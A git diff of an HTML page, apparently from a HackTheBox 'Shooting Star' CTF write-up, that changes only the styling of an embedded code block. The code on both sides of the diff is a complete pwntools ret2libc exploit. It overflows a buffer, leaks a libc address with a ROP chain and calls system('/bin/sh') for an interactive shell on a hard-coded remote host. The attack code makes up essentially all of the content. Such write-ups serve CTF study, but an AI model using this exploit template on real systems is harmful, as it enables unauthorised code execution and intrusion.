@@ -46,66 +46,51 @@
 <div>
     <img src="../imgs/hackthebox/shooting_star9.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
-elf = context.binary = ELF('./vuln')
-libc = elf.libc
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./vuln'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
 
-local = False
+<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">False</span>
 
-if local:
-    p = elf.process()
-else:
-    host = '46.101.23.188'
-    port = 31686
-    p = remote(host,port)
+<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
+<span style="color: #859900">else</span><span style="color: #839496">:</span>
+    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'46.101.23.188'</span>
+    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">31686</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>
 
-rop = ROP([elf])
+<span style="color: #839496">rop</span> <span style="color: #586e75">=</span> <span style="color: #839496">ROP([elf])</span>
 
-WRITE_PLT = p64(elf.plt['write'])
-WRITE_GOT = p64(elf.got['read'])
-pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
-pop_rsi_r15 = p64(0x4012c9)
-main = p64(elf.sym['main'])
+<span style="color: #839496">WRITE_PLT</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">plt[</span><span style="color: #2aa198">'write'</span><span style="color: #839496">])</span>
+<span style="color: #839496">WRITE_GOT</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">got[</span><span style="color: #2aa198">'read'</span><span style="color: #839496">])</span>
+<span style="color: #839496">pop_rdi</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(rop</span><span style="color: #586e75">.</span><span style="color: #839496">find_gadget([</span><span style="color: #2aa198">'pop rdi'</span><span style="color: #839496">,</span> <span style="color: #2aa198">'ret'</span><span style="color: #839496">])[</span><span style="color: #2aa198">0</span><span style="color: #839496">])</span>
+<span style="color: #839496">pop_rsi_r15</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x4012c9</span><span style="color: #839496">)</span>
+<span style="color: #839496">main</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">sym[</span><span style="color: #2aa198">'main'</span><span style="color: #839496">])</span>
 
-payload1 = b'A'*72 + pop_rsi_r15 + WRITE_GOT + p64(0x0) + pop_rdi + p64(0x1) + WRITE_PLT + main
+<span style="color: #839496">payload1</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">72</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rsi_r15</span> <span style="color: #586e75">+</span> <span style="color: #839496">WRITE_GOT</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x0</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rdi</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x1</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">WRITE_PLT</span> <span style="color: #586e75">+</span> <span style="color: #839496">main</span>
 
-p.sendline('1')
-p.sendline(payload1)
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload1)</span>
 
-p.recvuntil('true!\n')
-data = p.recv(8)
-libc.address = u64(data.ljust(8,b"\x00")) - 0x110140
-p.clean()
-print('[+] Libc Address: ' + str(hex(libc.address)))
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'true!\n'</span><span style="color: #839496">)</span>
+<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recv(</span><span style="color: #2aa198">8</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span><span style="color: #586e75">.</span><span style="color: #839496">address</span> <span style="color: #586e75">=</span> <span style="color: #839496">u64(data</span><span style="color: #586e75">.</span><span style="color: #839496">ljust(</span><span style="color: #2aa198">8</span><span style="color: #839496">,</span><span style="color: #2aa198">b"\x00"</span><span style="color: #839496">))</span> <span style="color: #586e75">-</span> <span style="color: #2aa198">0x110140</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #268bd2">print</span><span style="color: #839496">(</span><span style="color: #2aa198">'[+] Libc Address: '</span> <span style="color: #586e75">+</span> <span style="color: #268bd2">str</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(libc</span><span style="color: #586e75">.</span><span style="color: #839496">address)))</span>
 
-binsh = p64(next(libc.search(b'/bin/sh\x00')))
-system = p64(libc.sym['system'])
-ret = p64(rop.find_gadget(['ret'])[0])
+<span style="color: #839496">binsh</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #268bd2">next</span><span style="color: #839496">(libc</span><span style="color: #586e75">.</span><span style="color: #839496">search(</span><span style="color: #2aa198">b'/bin/sh\x00'</span><span style="color: #839496">)))</span>
+<span style="color: #839496">system</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym[</span><span style="color: #2aa198">'system'</span><span style="color: #839496">])</span>
+<span style="color: #839496">ret</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(rop</span><span style="color: #586e75">.</span><span style="color: #839496">find_gadget([</span><span style="color: #2aa198">'ret'</span><span style="color: #839496">])[</span><span style="color: #2aa198">0</span><span style="color: #839496">])</span>
 
-payload2 = b'A'*72 + pop_rdi + binsh + system
+<span style="color: #839496">payload2</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">72</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rdi</span> <span style="color: #586e75">+</span> <span style="color: #839496">binsh</span> <span style="color: #586e75">+</span> <span style="color: #839496">system</span>
 
-p.sendline('1')
-p.sendline(payload2)
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload2)</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <br><br>
 
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
